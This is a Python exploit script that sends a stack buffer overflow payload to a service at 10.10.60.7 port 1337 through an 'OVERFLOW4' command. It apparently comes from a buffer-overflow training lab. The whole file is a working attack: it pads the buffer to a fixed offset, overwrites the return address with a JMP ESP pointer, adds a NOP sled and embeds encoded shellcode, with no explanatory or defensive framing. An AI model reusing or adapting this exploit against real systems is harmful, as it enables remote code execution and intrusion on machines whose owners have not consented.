import socket, struct
host, port ='10.10.60.7', 1337
command = b'OVERFLOW4 '
length = 2988
offset = 2026
payload_size = length - offset
shellcode =  b""
shellcode += b"\xdb\xcf\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52"
shellcode += b"\xbb\x82\xc1\x25\x28\x83\xc6\x04\x31\x5e\x13"
shellcode += b"\x03\xdc\xd2\xc7\xdd\x1c\x3c\x85\x1e\xdc\xbd"
shellcode += b"\xea\x97\x39\x8c\x2a\xc3\x4a\xbf\x9a\x87\x1e"
shellcode += b"\x4c\x50\xc5\x8a\xc7\x14\xc2\xbd\x60\x92\x34"
shellcode += b"\xf0\x71\x8f\x05\x93\xf1\xd2\x59\x73\xcb\x1c"
shellcode += b"\xac\x72\x0c\x40\x5d\x26\xc5\x0e\xf0\xd6\x62"
shellcode += b"\x5a\xc9\x5d\x38\x4a\x49\x82\x89\x6d\x78\x15"
shellcode += b"\x81\x37\x5a\x94\x46\x4c\xd3\x8e\x8b\x69\xad"
shellcode += b"\x25\x7f\x05\x2c\xef\xb1\xe6\x83\xce\x7d\x15"
shellcode += b"\xdd\x17\xb9\xc6\xa8\x61\xb9\x7b\xab\xb6\xc3"
shellcode += b"\xa7\x3e\x2c\x63\x23\x98\x88\x95\xe0\x7f\x5b"
shellcode += b"\x99\x4d\x0b\x03\xbe\x50\xd8\x38\xba\xd9\xdf"
shellcode += b"\xee\x4a\x99\xfb\x2a\x16\x79\x65\x6b\xf2\x2c"
shellcode += b"\x9a\x6b\x5d\x90\x3e\xe0\x70\xc5\x32\xab\x1c"
shellcode += b"\x2a\x7f\x53\xdd\x24\x08\x20\xef\xeb\xa2\xae"
shellcode += b"\x43\x63\x6d\x29\xa3\x5e\xc9\xa5\x5a\x61\x2a"
shellcode += b"\xec\x98\x35\x7a\x86\x09\x36\x11\x56\xb5\xe3"
shellcode += b"\xb6\x06\x19\x5c\x77\xf6\xd9\x0c\x1f\x1c\xd6"
shellcode += b"\x73\x3f\x1f\x3c\x1c\xaa\xda\xd7\x29\x20\xd1"
shellcode += b"\x1f\x46\x34\x19\x43\xbf\xb1\xff\xe9\xaf\x97"
shellcode += b"\xa8\x85\x56\xb2\x22\x37\x96\x68\x4f\x77\x1c"
shellcode += b"\x9f\xb0\x36\xd5\xea\xa2\xaf\x15\xa1\x98\x66"
shellcode += b"\x29\x1f\xb4\xe5\xb8\xc4\x44\x63\xa1\x52\x13"
shellcode += b"\x24\x17\xab\xf1\xd8\x0e\x05\xe7\x20\xd6\x6e"
shellcode += b"\xa3\xfe\x2b\x70\x2a\x72\x17\x56\x3c\x4a\x98"
shellcode += b"\xd2\x68\x02\xcf\x8c\xc6\xe4\xb9\x7e\xb0\xbe"
shellcode += b"\x16\x29\x54\x46\x55\xea\x22\x47\xb0\x9c\xca"
shellcode += b"\xf6\x6d\xd9\xf5\x37\xfa\xed\x8e\x25\x9a\x12"
shellcode += b"\x45\xee\xaa\x58\xc7\x47\x23\x05\x92\xd5\x2e"
shellcode += b"\xb6\x49\x19\x57\x35\x7b\xe2\xac\x25\x0e\xe7"
shellcode += b"\xe9\xe1\xe3\x95\x62\x84\x03\x09\x82\x8d"
def p32(data):
        return struct.pack("<I", data)
jmp_esp = p32(0x625011D3)
all_chars = bytearray(range(1,256))
bad_chars = [
b'\xa9',
b'\xcd',
b'\xd4'
]
op_sled = b'\x90'*10
final = payload_size - len(jmp_esp) - len(op_sled)
print(final)
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

payload = b''.join([
command,
b'A' * offset,
jmp_esp,
op_sled,
shellcode,
b'C' * (length - offset - len(jmp_esp) - len(op_sled) - len(shellcode)),


])
with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)

